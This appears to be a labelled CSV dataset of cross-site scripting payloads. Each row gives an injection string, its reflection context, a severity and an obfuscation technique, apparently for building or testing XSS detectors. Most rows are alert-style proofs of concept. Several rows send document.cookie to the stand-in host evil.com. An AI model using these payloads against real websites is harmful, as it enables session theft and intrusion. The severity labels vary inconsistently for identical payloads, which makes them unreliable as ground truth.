payload,payload_with_context,context,severity,source,sink,reflection_position,technique
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,high,,,script,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],template_injection,medium,,,attribute,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",script_injection,medium,,,script,original
{{7*7}},{{7*7}} [position:script],template_injection,high,,,script,obfuscated:tab_newline_inject
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in) [position:style],template_injection,medium,,,style,obfuscated:unicode_escape
{{7*7}},{{7*7}} [position:style],template_injection,medium,,,style,obfuscated:concat_split
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""","document.body.innerHTML=""<svg src=x onerror=alert(1)>"" [position:script]",dom_sink,high,,,script,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:url_encode
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,medium,,,script,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:attribute]",template_injection,low,,,attribute,original
<SCRIPT>alert(document.domain)</SCRIPT>,<SCRIPT>alert(document.domain)</SCRIPT> [position:script],script_injection,low,,,script,mutated
\' onload=alert(1)//,\' onload=alert(1)// [position:attribute],attribute,high,,,attribute,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,obfuscated:hex_escape
"&quot; onerror
=alert(	1) x
=&quot;","&quot; onerror
=alert(	1) x
=&quot; [position:attribute]",attribute_escape,low,,,attribute,obfuscated:tab_newline_inject
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,original
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",dom_sink,low,,,script,original
#{alert(1)},#{alert(1)} [position:attribute],template_injection,low,,,attribute,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",script_injection,high,,,script,original
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,medium,,,attribute,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],event_handler,medium,,,attribute,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:html_body]",script_injection,high,,,html_body,obfuscated:comment_inject
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:attribute]",js_uri,low,,,attribute,original
<img src=x onerror=al'+'ert(1)>,<img src=x onerror=al'+'ert(1)> [position:html_body],event_handler,low,,,html_body,obfuscated:concat_split
${alert(1)},${alert(1)} [position:none],template_injection,high,,,none,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,low,,,script,original
&lt;img src=x onerror=alert(1)&gt;,&lt;img src=x onerror=alert(1)&gt; [position:script],tag_injection,medium,,,script,obfuscated:html_entity
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
嘼img src=1 onchange=alert(1)嘾,嘼img src=1 onchange=alert(1)嘾 [position:attribute],attribute,medium,,,attribute,mutated
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],attribute,high,,,attribute,mutated
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>","data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt> [position:script]",js_uri,medium,,,script,obfuscated:comment_inject
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""","\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)"" [position:none]",template_injection,low,,,none,obfuscated:unicode_escape
\x3csvg/onload=alert(1)\x3e,\x3csvg/onload=alert(1)\x3e [position:html_body],tag_injection,low,,,html_body,obfuscated:hex_escape
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:attribute],event_handler,low,,,attribute,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,medium,,,html_body,original
javascript:confirm(1),javascript:confirm(1) [position:attribute],url,medium,,,attribute,none
%3cimg onpaste=alert(1) src=a%3e,%3cimg onpaste=alert(1) src=a%3e [position:attribute],attribute,medium,,,attribute,mutated
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:dom],html_body,medium,,,dom,none
"%3Cscript%3Edocument.location=""http://evil.com/?c=""+document.cookie%3C/script%3E","%3Cscript%3Edocument.location=""http://evil.com/?c=""+document.cookie%3C/script%3E [position:style]",attribute_escape,low,,,style,obfuscated:url_encode
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,low,,,attribute,obfuscated:hex_escape
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:attribute],event_handler,medium,,,attribute,original
%3Csvg/onload=alert(1)%3E,%3Csvg/onload=alert(1)%3E [position:html_body],tag_injection,medium,,,html_body,obfuscated:url_encode
"ontouchstart=""alert(1)""","ontouchstart=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
<img/src=x onload=alert(1)//>,<img/src=x onload=alert(1)//> [position:html_body],event_handler,medium,,,html_body,mutated
<marquee onload=alert()>,<marquee onload=alert()> [position:html_body],html_body,medium,,,html_body,mutated
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:script],script_injection,low,,,script,obfuscated:unicode_escape
%3C%= alert(1) %%3E,%3C%= alert(1) %%3E [position:script],js_uri,high,,,script,obfuscated:url_encode
javascript:confirm(1),javascript:confirm(1) [position:none],js_uri,high,,,none,original
${alert(	1)},${alert(	1)} [position:attribute],template_injection,high,,,attribute,obfuscated:tab_newline_inject
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:html_body],attribute_escape,low,,,html_body,original
{{7*7}},{{7*7}} [position:html_body],template_injection,medium,,,html_body,obfuscated:mixed_case
javascript:window.alert(1)//,javascript:window.alert(1)// [position:attribute],url,medium,,,attribute,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],js_uri,high,,,html_body,original
${alert(1)},${alert(1)} [position:style],template_injection,high,,,style,original
<img/src=x onerror=confirm(1)//>,<img/src=x onerror=confirm(1)//> [position:script],script_injection,low,,,script,mutated
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,low,,,html_body,original
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>","<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT> [position:script]",script_injection,medium,,,script,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",script_injection,medium,,,script,original
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:html_body],attribute_escape,medium,,,html_body,mutated
<SCRIPT>confirm(1)</SCRIPT>,<SCRIPT>confirm(1)</SCRIPT> [position:attribute],template_injection,high,,,attribute,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,low,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,medium,,,html_body,original
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],html_body,medium,,,html_body,case_variation
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,high,,,style,obfuscated:comment_inject
#{alert(1)},#{alert(1)} [position:style],template_injection,low,,,style,original
"eval(""al'+'ert(1)"")","eval(""al'+'ert(1)"") [position:script]",dom_sink,low,,,script,obfuscated:concat_split
<%= alert(1) %>,<%= alert(1) %> [position:html_body],event_handler,low,,,html_body,original
"' onmouseover
=alert(	1) '","' onmouseover
=alert(	1) ' [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:attribute]",attribute,low,,,attribute,original
<body onload=alert(1)>,<body onload=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
<video src=x onerror=confirm(1)>,<video src=x onerror=confirm(1)> [position:none],event_handler,low,,,none,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:style]",attribute_escape,low,,,style,mutated
<svg onload=confirm`1`>,<svg onload=confirm`1`> [position:comment],attribute,medium,,,comment,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:comment_inject
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:script],script_injection,low,,,script,obfuscated:comment_inject
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>","data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt> [position:script]",tag_injection,high,,,script,obfuscated:comment_inject
""" onfocus=al'+'ert(1) autofocus=""",""" onfocus=al'+'ert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,obfuscated:concat_split
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",attribute_escape,low,,,script,original
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,low,,,html_body,original
<SCRIPT>confirm(1)</SCRIPT>,<SCRIPT>confirm(1)</SCRIPT> [position:script],script_injection,low,,,script,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,medium,,,none,original
""">< script>alert(String.fromCharCode(88,83,83))</script>",""">< script>alert(String.fromCharCode(88,83,83))</script> [position:html_body]",html_body,high,,,html_body,mutated
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute,medium,,,attribute,mutated
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,medium,,,html_body,original
"<ScrIpT>D.iNNeRhtml+='';</ScrIPt>//[""'`-->]]>]</DIv>","<ScrIpT>D.iNNeRhtml+='';</ScrIPt>//[""'`-->]]>]</DIv> [position:html_body]",html_body,high,,,html_body,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,low,,,attribute,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,high,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,low,,,attribute,original
' ><img src=x onerror=confirm(1)>,' ><img src=x onerror=confirm(1)> [position:attribute],attribute,low,,,attribute,mutated
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:style],js_uri,medium,,,style,mutated
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:html_body],script_injection,low,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],attribute_escape,high,,,attribute,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:style],event_handler,high,,,style,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],event_handler,low,,,attribute,original
<img/src=x onload=alert(1)//>,<img/src=x onload=alert(1)//> [position:html_body],template_injection,medium,,,html_body,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",attribute_escape,medium,,,html_body,obfuscated:html_entity
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,obfuscated:hex_escape
